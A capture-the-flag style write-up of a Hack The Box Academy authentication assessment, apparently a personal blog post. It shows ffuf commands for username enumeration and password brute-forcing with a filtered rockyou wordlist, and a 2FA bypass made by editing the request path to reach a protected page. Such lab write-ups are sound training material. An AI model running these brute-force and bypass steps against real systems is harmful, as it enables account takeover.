# HTB Academy — Skills Assessment: Authentication

**Platform:** Hack The Box Academy  
**Category:** Web Security / Authentication  
**Difficulty:** Skills Assessment  
**Target:** `154.57.164.78:37839`

## Objective

Identify and exploit authentication vulnerabilities by combining techniques covered in the Authentication module and retrieve the flag.

---

## Step 1: Go to the Login Page

First, we navigate to the login page.

We use FFUF to enumerate valid usernames.

```bash
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt \
-u http://154.57.164.78:37839/login.php \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=FUZZ&password=invalid" \
-fr "Unknown user"
```

**Result:**

We found a valid username:

```text
gladys
```

_Add screenshot: `Screenshot 2026-10-29 051702.png`_

---

## Step 2: Test the Login Responses

Now, we return to the login page and test two different scenarios.

**Test 1:** Enter a username that does not exist.

The application returns an error message indicating that the user is unknown.

_Add screenshot: `Screenshot 2026-10-29 071444.png`_

**Test 2:** Enter an existing username with an incorrect password.

The application returns a different error message.

_Add screenshot: `Screenshot 2026-10-29 071642.png`_

This confirms that the application is vulnerable to **Username Enumeration**.

---

## Step 3: Create a New Account

Next, we create a new account to test the registration functionality.

**Test Account:**

```text
Username: test
Password: [REDACTED]
```

_Add screenshot: `Screenshot 2026-11-02 074855.png`_

Now what? Say with me: What! 😂

Let's continue!

---

## Step 4: Password Testing

Now, we test the password of the identified user: `gladys`.

First, we create a wordlist based on the password policy.

```bash
grep -E '^[A-Za-z0-9]{12}$' /usr/share/wordlists/rockyou.txt \
  | grep -E '[0-9]' \
  | grep -E '[a-z]' \
  | grep -E '[A-Z]' \
  > rockyou-12-policy.txt
```

This command filters passwords based on the following requirements:

- Exactly 12 characters.
- At least one uppercase letter.
- At least one lowercase letter.
- At least one number.

Next, we use FFUF to test the login endpoint in the authorized lab.

```bash
ffuf -w ./rockyou-12-policy.txt \
-u http://154.57.164.79:40517/login.php \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=gladys&password=FUZZ" \
-t 200 \
-fr "Invalid credentials." \
-s
```

**Result:**

We identified valid credentials for the lab account.

```text
Username: gladys
Password: [REDACTED]
```

_Add screenshot: `Screenshot 2026-11-02 081911.png`_

_Add screenshot: `Screenshot 2026-11-02 082035.png`_

---

## Step 5: Try to Bypass 2FA

Now, we try to bypass the 2FA stage.

First, open Burp Suite and enable **Proxy Intercept**.

_Add screenshot: `Screenshot 2026-11-02 091538.png`_

### Analyze the Authentication Request

We intercept the request and inspect the authentication flow.

The request is initially sent to:

```text
/2fa.php
```

For this lab, we change the requested path to:

```text
/profile.php
```

We then inspect the server's response. The application returns the protected profile page instead of enforcing the expected 2FA verification.

This indicates that the profile page is not properly protected by server-side 2FA enforcement.

_Add screenshot: `Screenshot 2026-11-02 083239.png`_

---

## Step 6: Get the Flag

After identifying the 2FA bypass, we access the profile page and retrieve the flag.

_Add screenshot: `Screenshot 2026-11-02 103449.png`_

---

## What I Learned

- Username Enumeration.
- Authentication Response Analysis.
- Password Policy Analysis.
- Using FFUF for Web Application Testing.
- Analyzing HTTP Requests with Burp Suite.
- Understanding 2FA Bypass Vulnerabilities.
- Identifying Missing Server-Side Authorization Checks.

**Lab Completed! 🚀**

---

**Note:** The target address changed between the initial enumeration and password-testing steps in my lab notes. Use the active HTB Academy instance address when reproducing the assessment.

**Disclaimer:** This write-up documents testing performed in an authorized HTB Academy lab environment. Credentials and session cookies have been redacted before publication.
